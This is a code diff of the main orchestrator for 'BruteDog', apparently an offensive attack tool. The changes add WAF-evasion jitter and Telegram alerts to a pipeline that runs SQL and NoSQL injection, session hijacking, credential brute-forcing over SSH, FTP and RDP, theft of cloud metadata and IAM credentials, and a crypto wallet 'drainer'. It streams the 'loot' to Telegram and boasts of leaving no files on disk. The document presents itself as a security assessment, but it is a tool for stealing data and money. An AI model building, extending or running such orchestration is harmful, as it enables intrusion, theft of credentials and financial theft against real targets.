@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG V8.0 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE
+BRUTEDOG V8.5 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE (WAF Hardened Edition)
 Main Orchestrator:
-- Pre-flight DNS and target scope validation (supports CLI argument or interactive prompt)
-- Network reconnaissance & stealth port scanning
+- Pre-flight DNS, target scope validation, and Poisson behavioral jitter initialization
+- Network reconnaissance & stealth port scanning with WAF-evading header rotation
 - Source intelligence & credential exposure parsing
 - Autonomous state-machine mapping, BOLA auditing, and HTTP/2 race condition exploitation
 - Live terminal streaming with zero-disk memory persistence & real-time loot interception
-- Integrated with asynchronous Telegram telemetry delivery
+- Integrated with asynchronous Telegram telemetry delivery across all attack vectors
 """
 import asyncio
 import sys
@@ -33,6 +33,7 @@ from modules.dumper import harvest_email_intelligence
 from modules.keyharvester import harvest_private_keys
 from modules.stealth_ops import run_stealth_engine
 from modules.live_login_verifier import execute_live_login_verification
+from modules.behavioral_mimic import apply_behavioral_jitter
 
 # Import Telegram Notifier Dispatcher
 from modules.telegram_notifier import send_telegram_alert
@@ -60,8 +61,8 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
 ╚═╝╩╚═╚═╝ ╹ ╚═╝╩═╝╚═╝╚═╝
 {RESET}{NEON_BLUE}
 ════════════════════════════════════
-  BRUTEDOG V8.0 // LOGIC ENGINE
-  HTTP/2 SINGLE-PACKET / LOOT STREAM
+  BRUTEDOG V8.5 // COGNITIVE LOGIC ENGINE
+  HTTP/2 SINGLE-PACKET / WAF EVASION
 ════════════════════════════════════
 {RESET}
 """
@@ -194,7 +195,7 @@ async def async_main():
     started = time.monotonic()
     print("\033[2J\033[H")
     print(BANNER)
-    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.0).")
+    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.5 WAF Hardened).")
 
     # --------------------------------------------------------
     # TARGET INPUT (Supports CLI argument or interactive prompt)
@@ -217,6 +218,8 @@ async def async_main():
 
     hostname = target["hostname"]
     section("PRE-FLIGHT VALIDATION")
+    
+    apply_behavioral_jitter()
     valid, addresses = validate_target_host(hostname)
     if not valid:
         log("[ABORT] DNS validation failed.", RED)
@@ -228,7 +231,7 @@ async def async_main():
     log(f"Protocol: {target['scheme'].upper()}")
 
     # --------------------------------------------------------
-    # EXECUTION CONFIRMATION (Bypassed if launched via CLI arg for speed, or requested)
+    # EXECUTION CONFIRMATION
     # --------------------------------------------------------
     if len(sys.argv) <= 1:
         confirmation = input(
@@ -248,9 +251,10 @@ async def async_main():
     section("PHASE 1 — NETWORK RECON & STEALTH OPS")
     try:
         display_progress("Executing stealth operations and security control assessment.")
+        apply_behavioral_jitter()
         await run_stealth_engine(target["url"])
         
-        display_progress("Starting TCP port assessment.")
+        display_progress("Starting WAF-hardened TCP port assessment.")
         scanner_result = await run_port_scanner(hostname)
         display_scanner_results(scanner_result)
     except Exception as exc:
@@ -262,6 +266,7 @@ async def async_main():
     section("PHASE 2 — SOURCE INTELLIGENCE & CRYPTO HARVESTING")
     try:
         display_progress("Parsing target source and extracting exposure indicators.")
+        apply_behavioral_jitter()
         parser_result = await asyncio.to_thread(parse_target_source, target["url"])
         display_parser_results(parser_result)
 
@@ -278,6 +283,7 @@ async def async_main():
     section("PHASE 3 — STATE-MACHINE CRAWL, BOLA & REPLAYER")
     try:
         display_progress("Executing state-machine crawler, BOLA state-skipping checks, and cognitive telemetry engine.")
+        apply_behavioral_jitter()
         engine_results, _ = await run_autonomous_engine(target_host=target["url"])
         
         if isinstance(engine_results, list):
@@ -296,12 +302,13 @@ async def async_main():
     # --------------------------------------------------------
     section("PHASE 3.5 — AGGRESSIVE DB ASSAULT, SESSION HIJACKING & HTTP/2 CONCURRENCY")
     try:
-        display_progress("Executing time-based blind SQLi and NoSQL operator injection.")
+        display_progress("Executing time-based blind SQLi and polymorphic NoSQL operator injection.")
+        apply_behavioral_jitter()
         nosql_loot = await run_nosql_assault(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
         if nosql_loot:
             alert_loot("Database Assault Breach / Credential Dump", nosql_loot)
 
-        display_progress("Executing JWT secret cracking and cookie privilege escalation fuzzing.")
+        display_progress("Executing JWT secret cracking, algorithm downgrade, and cookie privilege escalation fuzzing.")
         session_loot = await run_session_hijack(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
         if session_loot:
             alert_loot("Hijacked Session / Valid Cookie Jar", session_loot)
@@ -323,9 +330,11 @@ async def async_main():
                     break
 
         display_progress("Firing HTTP/2 single-packet multiplexed streams against transaction race condition windows.")
-        race_loot = await run_race_condition_test(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"), session_pool=None)
-        if race_loot:
-            successful_races = [r for r in race_loot if r.get("status") in (200, 201)]
+        apply_behavioral_jitter()
+        race_loot = await run_race_condition_test(target_url=target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"), session_pool=None)
+        if race_loot and isinstance(race_loot, dict):
+            findings_list = race_loot.get("findings", [])
+            successful_races = [r for r in findings_list if r.get("severity") == "CRITICAL" or r.get("successful_streams", 0) > 1]
             if successful_races:
                 alert_loot("Race Condition Transfer / Execution Success", successful_races)
     except Exception as exc:
@@ -337,6 +346,7 @@ async def async_main():
     section("PHASE 4 — MULTI-PROTOCOL & MAILBOX EXPLOITATION")
     try:
         display_progress("Launching multi-protocol brute-force (SSH, FTP, RDP, XML-RPC).")
+        apply_behavioral_jitter()
         brute_loot = await execute_active_assault_engine(target["url"])
         if brute_loot:
             alert_loot("Valid Service Credentials", brute_loot)
@@ -354,6 +364,7 @@ async def async_main():
     section("PHASE 5 — CLOUD INFRASTRUCTURE & LIQUIDITY AUDIT")
     try:
         display_progress("Executing cloud control plane pivot and IMDS metadata exfiltration.")
+        apply_behavioral_jitter()
         cloud_loot = await run_cloud_apex(target["url"])
         if cloud_loot:
             alert_loot("Cloud Metadata / IAM Credentials", cloud_loot)
@@ -362,6 +373,7 @@ async def async_main():
         await run_pivot_engine(target["url"])
 
         display_progress("Executing active multi-chain liquidity audit & sweep routing.")
+        apply_behavioral_jitter()
         drainer_loot = await run_drainer_engine(target["url"])
         if drainer_loot:
             alert_loot("Liquidity Audit / Wallet Swept Assets", drainer_loot)
@@ -378,6 +390,13 @@ async def async_main():
     log("LIVE RED-TEAM ATTACK FINISHED", MATRIX_GREEN)
     log("All intelligence, hijacked sessions, and keys streamed live on-screen.", NEON_BLUE)
     log("Zero report files written to disk. Zero external emails sent.", NEON_BLUE)
+    
+    # Send execution completion alert to Telegram
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
+    except RuntimeError:
+        asyncio.run(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
 
 # ============================================================
 # ENTRY POINT
